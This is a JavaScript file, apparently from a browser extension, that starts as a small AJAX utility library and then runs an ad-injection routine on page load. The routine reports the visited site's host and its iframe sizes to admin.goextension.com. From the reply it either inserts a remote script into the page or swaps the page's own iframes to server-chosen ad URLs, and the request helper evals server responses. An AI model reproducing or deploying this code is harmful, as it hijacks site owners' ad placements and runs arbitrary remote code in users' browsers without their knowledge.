var cxg = {};
/**
 * [cxg.extend description] 合并项 cxg.extend({a:1,b:2,c:2,d:3},{d:5,f:6,e:70})
 * @param  {[type]} defined [description] 默认选项卡
 * @param  {[type]} options [description] 需要合并选项卡
 * @return {[type]}         [description]
 */
cxg.extend = function(defined,options){
    var obj = {};
    for(var key in defined){
        obj[key] = defined[key];
    }

    for(var k in options){
        obj[k] = options[k];
    }
    return obj;
};

/**
 * [_join description] 对象转化为字符串  _join({a:1,b:2,c:2});
 * @param  {[type]} data [description] 转化对象
 * @return {[type]}      [description]
 */
cxg.join = function(data){
    if (!data || typeof data !== 'object') {
        return '';
    }
    var str = '',i = 0;
    for(var key in data){
        if(i == 0) str += key + '=' + data[key];
        else  str += '&' + key + '=' + data[key];
        i++;
    }
    return str;
}
/**
 * [ajax description] 异步请求
 * @return {[type]} [description]
 */
cxg.ajax = function(obj){
    //默认值设置
    var defined = {
        url : null,
        data : {},
        success : null,
        error : null,
        async : true,
        type : 'GET',
        dataType : 'json',
        headers : null
    };

    //合并项
    var opt = cxg.extend(defined,obj);
    opt['type'] = opt['type'].toUpperCase();

    //没有传链接地址不处理
    if (!opt.url) {
        return;
    }

    //只处理GET和POST请求
    if (opt.type !== 'GET' && opt.type !== 'POST') {
        return;
    }

    //当时get请求的时候参数处理
    if (opt.type === 'GET') {
        var strData = cxg.join(opt.data);
        opt.url = opt.url.indexOf('?') > -1 ? opt.url + '&' + strData : opt.url  +'?' + strData;
    }else{
        var strData = cxg.join(opt.data);
    }

    //创建请求对象
    var _XHR = new XMLHttpRequest();

    //获取请求状态
    _XHR.onreadystatechange = function() {
        if (_XHR.readyState == 4 && _XHR.status == 200 ) {
            if (typeof opt.success == 'function') {
                if(opt.dataType == 'json') opt.success(eval('(' + _XHR.responseText + ')'));
                else if(opt.dataType == 'html') opt.success(_XHR.responseText);
            }
        }
        if (_XHR.readyState == 4 && _XHR.status != 200) {
            if (typeof opt.error == 'function') {
                opt.error(_XHR);
            }
        }
    };

    //打开请求通道
    _XHR.open(opt.type, opt.url, opt.async);

    //设置请求头
    if (opt.headers) {
        for (var key in opt.headers) {
            _XHR.setRequestHeader(String(key), String(opt.headers[key]));
        }
    }

    //发送请求
    if(opt.type == 'GET') var sendData = null;
    else{
        var sendData = strData;
        _XHR.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    }
    _XHR.send(sendData);
}


//当前网站host
var web = window.location.host;

/**
 * 获取页面当中所有的iframe
 * @type {NodeList}
 */
var oIframe = document.getElementsByTagName('iframe'),
    aIframe = [],   //所有的iframe
    aSize = [];     //iframe大小
for(var i=0 ; i<oIframe.length ; i++){
    if(oIframe[i].offsetWidth || oIframe[i].offsetHeight){
        aSize.push(oIframe[i].offsetWidth+'*'+oIframe[i].offsetHeight);
        aIframe.push(oIframe[i]);
    }
}

var url = '//admin.goextension.com';
/**
 *
 * @type {{size: Array, count: Number, web: string}}
 * size : iframe尺寸大小
 * count : iframe数量
 * web : 当前网站url
 */
var data = {
    size : aSize,
    count : aSize.length,
    web : web,
    appid : 759217506
};
if( aSize ){
    var oTime = new Date().getTime();
    cxg.ajax({
        url : url+'/api/get-ad',
        type : 'post',
        data : data,
        success : function(json){
            // 40003    没有接收到到参数
            // 40004    没有对应尺寸的广告
            // 40005    该网站在白名单内，不做广告替换
            if( json.code == 40003 || json.code == 40004 || json.code == 40005 )return;
            var data = json.data;

            // js广告
            if( data.type == 1 ){
                var script = document.createElement('script');
                script.src = data.list[0];
                var head = document.getElementsByTagName('head')[0];
                head.appendChild(script);
                // 配置广告
            }else if( data.type == 2 ){
                for(var i=0 ; i<data.list.length ; i++){
                    var bFlag = true;
                    var width = data.list[i].size.split('*')[0],
                        height = data.list[i].size.split('*')[1],
                        url = data.list[i].url;

                    for(var j=i ; j<aIframe.length ; j++){
                        var iIframeWidth = aIframe[j].offsetWidth,
                            iIframeHeight = aIframe[j].offsetHeight;
                        if( iIframeWidth == width && iIframeHeight == height && bFlag && !aIframe[j].getAttribute('bFlag') ){
                            aIframe[j].src = url;
                            aIframe[j].setAttribute('bFlag', true);
                            bFlag = false;
                        }
                    }
                }
            }
        }
    });
}

